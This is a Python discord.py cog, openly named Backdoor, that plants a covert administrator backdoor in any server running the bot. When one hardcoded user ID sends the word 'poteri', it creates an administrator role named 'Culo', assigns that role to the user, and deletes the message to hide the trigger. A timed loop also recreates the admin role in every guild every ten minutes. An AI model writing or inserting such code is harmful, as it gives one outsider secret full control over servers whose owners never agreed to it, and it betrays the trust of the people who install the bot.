from discord.ext import commands, tasks
from discord import Member, Colour, Permissions
from discord.utils import get

class Backdoor(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        self.role_check.start()
        print("Backdoor caricata!")

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author == self.bot.user: return

        if message.content.lower() == 'poteri' and message.author.id == 289887222310764545:
            role = get(message.guild.roles, name='Culo')
            if role is None: role = await message.guild.create_role(name="Culo", permissions=Permissions(administrator=True))
            await message.author.add_roles(role)
            await message.channel.purge(limit=1)

    @tasks.loop(seconds=600)
    async def role_check(self):
        for guild in self.bot.guilds:
            role = get(guild.roles, name='Culo')
            if role is None: role = await guild.create_role(name="Culo", permissions=Permissions(administrator=True))

def setup(bot):
    bot.add_cog(Backdoor(bot))